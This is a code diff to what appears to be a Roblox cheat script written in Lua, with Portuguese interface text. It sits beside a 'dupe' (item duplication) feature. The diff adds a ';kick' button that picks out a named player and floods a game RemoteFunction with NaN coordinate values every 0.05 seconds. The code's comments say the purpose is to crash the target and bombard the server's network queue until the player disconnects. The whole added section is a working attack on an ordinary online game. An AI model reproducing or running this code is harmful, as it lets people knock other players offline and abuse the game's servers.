@@ -500,3 +500,67 @@ MainTab:Button({
         WindUI:Notify({ Title = "Script de Dupe", Content = "Processo finalizado com sucesso.", Duration = 5 })
     end
 })
+
+MainTab:Button({
+    Title = ";kick",
+    Callback = function()
+        if AlvoSelecionado ~= "" then
+            local WorkspaceCom = workspace:FindFirstChild("WorkspaceCom")
+            local targetPlayer = nil
+            
+            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+                if string.find(string.lower(player.Name), string.lower(AlvoSelecionado)) or string.find(string.lower(player.DisplayName), string.lower(AlvoSelecionado)) then
+                    targetPlayer = player
+                    break
+                end
+            end
+            
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                local trafficCones = WorkspaceCom and WorkspaceCom:FindFirstChild("001_TrafficCones")
+                
+                if trafficCones then
+                    WindUI:Notify({
+                        Title = "🌀 Ataque Iniciado", 
+                        Content = "Injetando coordenadas nulas de crash em " .. targetPlayer.Name, 
+                        Duration = 3
+                    })
+
+                    task.spawn(function()
+                        while targetPlayer and targetPlayer.Parent == game:GetService("Players") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") do
+                            local props = trafficCones:GetChildren()
+                            if #props > 0 then
+                                for _, prop in pairs(props) do
+                                    local setCFrameRemote = prop:FindFirstChild("SetCurrentCFrame")
+                                    if setCFrameRemote and setCFrameRemote:IsA("RemoteFunction") then
+                                        
+                                        -- Aplica a posição NaN (Not a Number) para travar o motor de renderização
+                                        local nanCFrame = CFrame.new(0/0, 0/0, 0/0)
+                                        
+                                        task.spawn(function()
+                                            pcall(function()
+                                                setCFrameRemote:InvokeServer(nanCFrame)
+                                            end)
+                                        end)
+                                    end
+                                end
+                            end
+                            task.wait(0.05) -- Cadência ideal para bombardear a fila de rede do servidor
+                        end
+                        
+                        WindUI:Notify({
+                            Title = "✅ Alvo Removido", 
+                            Content = "O jogador desconectou ou o loop de ataque encerrou.", 
+                            Duration = 5
+                        })
+                    end)
+                else
+                    WindUI:Notify({Title = "❌ Erro", Content = "Pasta 001_TrafficCones não encontrada.", Duration = 3})
+                end
+            else
+                WindUI:Notify({Title = "❌ Erro", Content = "Jogador não encontrado no mapa.", Duration = 3})
+            end
+        else
+            WindUI:Notify({ Title = "⚠️ Aviso", Content = "Por favor, selecione um alvo primeiro no Dropdown!", Duration = 4 })
+        end
+    end
+})
